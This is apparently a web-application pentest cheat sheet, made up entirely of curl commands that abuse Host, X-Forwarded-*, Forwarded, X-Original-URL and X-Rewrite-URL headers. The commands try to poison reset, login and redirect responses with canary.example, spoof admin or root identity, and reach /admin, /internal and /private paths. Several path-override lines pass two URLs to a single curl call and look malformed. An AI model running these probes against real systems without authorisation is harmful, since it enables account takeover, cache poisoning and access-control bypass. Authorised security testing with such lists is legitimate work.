# Per-header — every host/rewrite/forwarded header, exhaustively

The header map — a header the app reads, a check the header gates.

---

## 1. Host — the canonical host header

```bash
curl -s -D - -H 'Host: canary.example' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -H 'Host: canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -D - -H 'Host: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
curl -s -D - -H 'Host: canary.example' "$BASE/callback" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/verify" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/confirm" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/sitemap.xml" | grep -i 'location\|set-cookie'
```

## 2. X-Forwarded-Host — the forwarded host header

```bash
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -H 'X-Forwarded-Host: canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/callback" | grep -i 'location'
```

## 3. X-Host — the forwarded host header

```bash
curl -s -D - -H 'X-Host: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -H 'X-Host: canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -D - -H 'X-Host: canary.example' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'X-Host: canary.example' "$BASE/redirect" | grep -i 'location'
```

## 4. X-Forwarded-Server — the forwarded server header

```bash
curl -s -D - -H 'X-Forwarded-Server: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -H 'X-Forwarded-Server: canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
```

## 5. X-HTTP-Host-Override — the forwarded host header

```bash
curl -s -D - -H 'X-HTTP-Host-Override: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -H 'X-HTTP-Host-Override: canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
```

## 6. X-Forwarded-Proto — the forwarded proto header

```bash
curl -s -D - -H 'X-Forwarded-Proto: http' "$BASE/page" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Proto: https' "$BASE/page" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Proto: http, https' "$BASE/page" | grep -i 'location\|set-cookie'
```

## 7. X-Forwarded-Scheme — the forwarded scheme header

```bash
curl -s -D - -H 'X-Forwarded-Scheme: http' "$BASE/page" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Scheme: https' "$BASE/page" | grep -i 'location\|set-cookie'
```

## 8. X-Forwarded-Port — the forwarded port header

```bash
curl -s -D - -H 'X-Forwarded-Port: 80' "$BASE/page" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Port: 443' "$BASE/page" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Port: 8080' "$BASE/page" | grep -i 'location\|set-cookie'
```

## 9. X-Forwarded-Path — the forwarded path header

```bash
curl -i "$BASE/admin" -H 'X-Forwarded-Path: /admin' "$BASE/" # 200 with the admin body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Path: /internal' "$BASE/" # 200 with the internal body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Path: /private' "$BASE/" # 200 with the private body = finding
```

## 10. X-Forwarded-Prefix — the forwarded prefix header

```bash
curl -i "$BASE/admin" -H 'X-Forwarded-Prefix: /admin' "$BASE/" # 200 with the admin body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Prefix: /internal' "$BASE/" # 200 with the internal body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Prefix: /private' "$BASE/" # 200 with the private body = finding
```

## 11. X-Forwarded-User — the forwarded user header

```bash
curl -s -D - -H 'X-Forwarded-User: admin' "$BASE/page" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-User: root' "$BASE/page" | grep -i 'location\|set-cookie'
```

## 12. X-Forwarded-Email — the forwarded email header

```bash
curl -s -D - -H 'X-Forwarded-Email: admin@target.com' "$BASE/page" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Email: user@target.com' "$BASE/page" | grep -i 'location\|set-cookie'
```

## 13. Forwarded — the RFC 7239 forwarded header

```bash
curl -s -H 'Forwarded: host=canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: for=127.0.0.1;host=canary.example;proto=http' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: host=canary.example;for=127.0.0.1' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: host=canary.example;proto=http' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: for=127.0.0.1;host=canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: for=127.0.0.1;host=canary.example;proto=https' "$BASE/page" | grep -o 'canary[^"< ]*'
```

## 14. X-Original-URL — the rewrite URL header

```bash
curl -i "$BASE/admin" -H 'X-Original-URL: /admin' "$BASE/" # 200 with the admin body = finding
curl -i "$BASE/admin" -H 'X-Original-URL: /internal' "$BASE/" # 200 with the internal body = finding
curl -i "$BASE/admin" -H 'X-Original-URL: /private' "$BASE/" # 200 with the private body = finding
curl -i "$BASE/admin" -H 'X-Original-URL: /api/admin' "$BASE/" # 200 with the api admin body = finding
curl -i "$BASE/admin" -H 'X-Original-URL: /api/internal' "$BASE/" # 200 with the api internal body = finding
curl -i "$BASE/admin" -H 'X-Original-URL: /api/private' "$BASE/" # 200 with the api private body = finding
```

## 15. X-Rewrite-URL — the rewrite URL header

```bash
curl -i "$BASE/admin" -H 'X-Rewrite-URL: /admin' "$BASE/" # 200 with the admin body = finding
curl -i "$BASE/admin" -H 'X-Rewrite-URL: /internal' "$BASE/" # 200 with the internal body = finding
curl -i "$BASE/admin" -H 'X-Rewrite-URL: /private' "$BASE/" # 200 with the private body = finding
curl -i "$BASE/admin" -H 'X-Rewrite-URL: /api/admin' "$BASE/" # 200 with the api admin body = finding
curl -i "$BASE/admin" -H 'X-Rewrite-URL: /api/internal' "$BASE/" # 200 with the api internal body = finding
curl -i "$BASE/admin" -H 'X-Rewrite-URL: /api/private' "$BASE/" # 200 with the api private body = finding
```

## 16. X-Original-Path — the rewrite path header

```bash
curl -i "$BASE/admin" -H 'X-Original-Path: /admin' "$BASE/" # 200 with the admin body = finding
curl -i "$BASE/admin" -H 'X-Original-Path: /internal' "$BASE/" # 200 with the internal body = finding
curl -i "$BASE/admin" -H 'X-Original-Path: /private' "$BASE/" # 200 with the private body = finding
```

## 17. X-Real-Path — the real path header

```bash
curl -i "$BASE/admin" -H 'X-Real-Path: /admin' "$BASE/" # 200 with the admin body = finding
curl -i "$BASE/admin" -H 'X-Real-Path: /internal' "$BASE/" # 200 with the internal body = finding
curl -i "$BASE/admin" -H 'X-Real-Path: /private' "$BASE/" # 200 with the private body = finding
```
